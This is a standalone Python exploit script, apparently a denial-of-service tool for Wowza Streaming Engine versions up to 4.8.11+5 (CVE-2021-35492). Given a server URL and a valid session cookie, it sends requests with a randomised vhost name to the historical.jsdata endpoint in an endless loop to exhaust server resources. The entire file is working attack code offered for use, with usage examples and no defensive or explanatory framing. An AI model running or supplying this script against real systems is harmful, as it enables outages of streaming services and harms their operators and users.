#!/usr/bin/python3

import argparse
import requests
import time
from random import randint
from urllib.parse import urlparse


def getArguments():
    # Get command-line arguments.
    examples = """examples:
  exploit: ./dos-exploit-wse.py -u http://wse.local:8088 -s CDA32846E8763F62293AAE42FA72C86B
           ./dos-exploit-wse.py --url http://wse.local:8088 --session CDA32846E8763F62293AAE42FA72C86B
"""

    parser = argparse.ArgumentParser(description='Denial of Service tool for Wowza Streaming Engine <= 4.8.11+5 - Uncontrolled Resource Consumption (CVE-2021-35492)', epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-u', '--url', help='Wowza Streaming Engine base URL.', required=True)
    parser.add_argument('-s', '--session', help='Valid JSESSIONID session cookie value.', required=True)
    args = parser.parse_args()

    # Basic checks of user input.
    # Check variable passwordlist.
    if args.session is None:
        print('Error: Please supply a valid JSESSIONID session cookie value.')
        exit()
    # Check variable URL.
    if args.url is not None:
        resultUrl = urlparse(args.url)
        isValid = all([resultUrl.scheme, resultUrl.netloc])
        if not isValid:
            print('Error: Check Wowza Streaming Engine base URL.')
            exit()

    # Returns a list.
    return args


def request(baseURL, session):
    # HTTP Request
    """
    GET http://wse.local:8088/enginemanager/server/vhost/historical.jsdata?vhost=_defaultVHost_&periodStart=2020-05-28T10%3A28%3A27%2B02%3A00&periodEnd=2021-05-28T23%3A59%3A59%2B02%3A00&_=1622189673554 HTTP/1.1
    Host: wse.local:8088
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest
    Connection: close
    Referer: http://wse.local:8088/enginemanager/Home.htm
    Cookie: JSESSIONID=CDA32846E8763F62293AAE42FA72C86B; lastMangerHost=http%3A//127.0.0.1%3A8087; showRightRail=true; DoNotShowFTU=false; lastTab=Advanced
    
    """
    epoch = str(int(time.time()))
    randnum = str(randint(0,999))
    suffix = epoch + '-' + randnum
    payload = {'vhost': '_defaultVHost_dos_' + suffix,
               'periodStart': '2020-05-28T10:28:27+02:00',
               'periodEnd': '2021-05-28T23:59:59+02:00',
               '_': '1622189673554'}

    headers = {'Accept': '*/*',
               'Accept-Language': 'en-US,en;q=0.5',
               'Accept-Encoding': 'gzip, deflate',
               'X-Requested-With': 'XMLHttpRequest',
               'Referer': 'http://wse.local:8088/enginemanager/Home.htm',
               'User-Agent': 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
               'Connection': 'close'}

    cookies = {'JSESSIONID': session,
               'lastMangerHost': 'http:://127.0.0.1:8087',
               'showRightRail': 'true',
               'DoNotShowFTU': 'false',
               'lastTab': 'Advanced'}

    url = baseURL + '/enginemanager/server/vhost/historical.jsdata'

    r = requests.get(url, params=payload, headers=headers, cookies=cookies, verify=False, allow_redirects=False, timeout=20)
    #print(r.text)


def request_loop(baseURL, session):
    while True:
        request(baseURL, session)


def main():
    # Get script arguments.
    args = getArguments()
    baseURL = args.url              # http://wse.local:8088
    session = args.session          # CDA32846E8763F62293AAE42FA72C86B
    request_loop(baseURL, session)


if __name__ == '__main__':
    main()
